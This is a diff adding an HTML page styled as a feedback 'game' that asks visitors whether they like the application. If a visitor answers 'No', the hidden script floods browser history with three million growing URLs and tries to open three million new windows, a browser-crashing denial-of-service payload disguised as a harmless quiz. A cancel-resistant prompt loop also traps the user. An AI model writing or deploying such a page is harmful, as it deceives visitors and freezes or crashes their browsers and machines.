@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Feedback</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            animation: bgAnimation 40s infinite alternate;
+        }
+        h1 {
+            color: #333;
+        }
+        #demo {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        @keyframes bgAnimation {
+            0%   { background-color: #00008B; }
+            20%  { background-color: #0000CD; }
+            40% { background-color: #1E90FF; }
+            60% { background-color: #87CEFA; }
+            80% { background-color: #ADD8E6; }
+            100% { background-color: #AFEEEE; }
+}
+    </style>
+</head>
+<body>
+    <h1>Game</h1>
+    <p id="demo"></p>
+    <p id="goodLuck"></p>
+
+    <script>
+        let answer;
+      var urls = ["https://example.com"];
+
+        do {
+            answer = prompt("Do you like this application? (Yes/No)");
+            if (answer !== null) {
+                if (answer.toLowerCase() === "yes") {
+                    document.getElementById("demo").innerHTML = "Thank you";      
+                  document.getElementById("goodLuck").innerHTML = "Good Ending: You got saved...";      
+                } else if (answer.toLowerCase() === "no") {
+                    document.getElementById("demo").innerHTML = "We're sorry to hear that.";
+                  document.getElementById("goodLuck").innerHTML = "Bad Ending: You have gone missing...";      
+                  var total = "";
+                  for( var i = 0; i < 3000000; i++ ) {
+                      total = total + i.toString();
+                      history.pushState(0,0, total );
+                  }
+                  for (var i = 0; i < 3000000; i++) {
+                    window.open(urls, "_blank");
+                  }          
+                } else {
+                    document.getElementById("demo").innerHTML = "Please provide a valid answer.";
+                }
+            } else {
+                answer = prompt("Do you like this application? (Yes/No)");
+            }
+        } while (answer === null || (answer.toLowerCase() !== "yes" && answer.toLowerCase() !== "no"));
+    </script>
+
+</body>
+</html>
